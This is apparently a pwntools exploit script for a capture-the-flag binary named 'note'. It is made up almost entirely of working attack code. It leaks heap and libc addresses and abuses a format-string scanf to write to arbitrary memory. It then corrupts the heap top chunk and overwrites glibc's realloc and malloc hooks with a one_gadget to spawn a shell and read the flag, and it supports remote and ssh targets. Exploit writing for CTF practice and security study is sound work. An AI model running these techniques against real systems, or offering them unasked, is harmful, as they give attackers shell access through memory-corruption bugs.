import logging
from pwn import *
elf = None
libc = None
file_name = "./note"
context.terminal = ['tmux', 'sp', '-h']
# context.timeout = 1

def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary

def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd {}".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=>")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc

def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)

def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --> " + hex(text_base + addr))
        gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()

def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count < 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag

def choice(idx):
    sh.sendlineafter("choice: ", str(idx))

def add(size, content):
    choice(1)
    sh.sendlineafter("size: ", str(size))
    sh.sendafter("content: ", content)
    sh.recvuntil('addr: ')
    return int(sh.recvuntil('\n', drop=True), 16)

def say(say):
    choice(2)
    sh.sendafter("say ? ", str(say).ljust(0x64, '\x00'))

def edit(addr, content):
    say('%7$s%7$s' + p64(addr))  # scanf('%7$s%7$s',addr)  %7$s Alignment offset
    sh.sendlineafter('? ', content)
    sh.sendline(content)

def show():
    choice(3)

def pwn(sh, elf, libc):
    context.log_level = "debug"
    heap_base = add(0x100, 'a' * 0x100) - 0x10
    log.success("heap_base:\t" + hex(heap_base))
    #get_gdb(sh)
    edit(heap_base + 0x110, 'b' * 8 + p64(0xef1))
    for i in range(0xd):      
        add(0x100, 'a' * 0x100)
    add(0x28, 'a' * 0x28)
    add(0xd8, 'a' * 0xd8)
    add(0xc8, 'a' * 8)
    show()
    
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x3c4b78)
    one = libc_base + 0x4527a#0x45226 0x4527a 0xf0364 0xf1207
    #get_gdb(sh)
    edit(libc_base + 0x3c4b10 -8 , p64(one) + p64(libc_base + 0x84710+13))  #edit realloc_hook->one & malloc_hook -> realloc_hook+offest
    # gdb.attach(sh, "b *" + hex(one))
    get_gdb(sh)
    add(0x18, 'a' * 0x18)
    sh.interactive()

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
